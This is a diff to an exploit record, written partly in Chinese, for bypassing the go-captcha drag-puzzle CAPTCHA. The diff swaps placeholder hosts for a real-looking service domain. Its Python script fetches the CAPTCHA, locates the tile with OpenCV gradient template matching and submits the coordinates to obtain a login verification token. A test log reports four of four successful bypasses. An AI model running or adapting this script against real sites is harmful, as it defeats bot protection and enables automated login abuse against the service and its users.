@@ -4,7 +4,7 @@
 - **kind**: exp
 - **category**: auth-bypass
 - **component**: go-captcha (drag/拼图行为验证码)
-- **versions**: go-captcha drag/blend 抠图实现（target458.example.com, New API fork modelsell-2026.08.24）
+- **versions**: go-captcha drag/blend 抠图实现（api.modelsell.cc, New API fork modelsell-2026.08.24）
 - **severity**: medium
 - **language**: python
 - **source**: self
@@ -48,13 +48,13 @@ def gm(x):
     gx = cv2.Sobel(x, cv2.CV_32F, 1, 0, 3); gy = cv2.Sobel(x, cv2.CV_32F, 0, 1, 3)
     return np.sqrt(gx**2 + gy**2).astype(np.uint8)
 c = httpx.Client(verify=False)
-d = target459.example.com(BASE+"/api/captcha", json={"scene":"login"}).json()["data"]
+d = c.post(BASE+"/api/captcha", json={"scene":"login"}).json()["data"]
 bg = cv2.imdecode(np.frombuffer(base64.b64decode(d["image"].split(",",1)[1]), np.uint8), 1)
 tile = cv2.imdecode(np.frombuffer(base64.b64decode(d["tile"].split(",",1)[1]), np.uint8), -1)
 res = cv2.matchTemplate(gm(cv2.cvtColor(bg, cv2.COLOR_BGR2GRAY)),
                         gm(cv2.cvtColor(tile[:,:,:3], cv2.COLOR_BGR2GRAY)), cv2.TM_CCOEFF_NORMED)
 _,_,_,loc = cv2.minMaxLoc(res)
-v = target459.example.com(BASE+"/api/captcha/verify", json={"scene":"login","captcha_key":d["captcha_key"],"x":loc[0],"y":loc[1]}).json()
+v = c.post(BASE+"/api/captcha/verify", json={"scene":"login","captcha_key":d["captcha_key"],"x":loc[0],"y":loc[1]}).json()
 # v["success"]==True, token = v["data"]["token"] → X-Go-Captcha-Token 头使用
 ```
 实测记录（example.com，2026-10-17）：4 个连续验证码 4/4 verify success:true；随后 /api/user/login 带 token 撞 429 限速（速率问题非破解问题）。
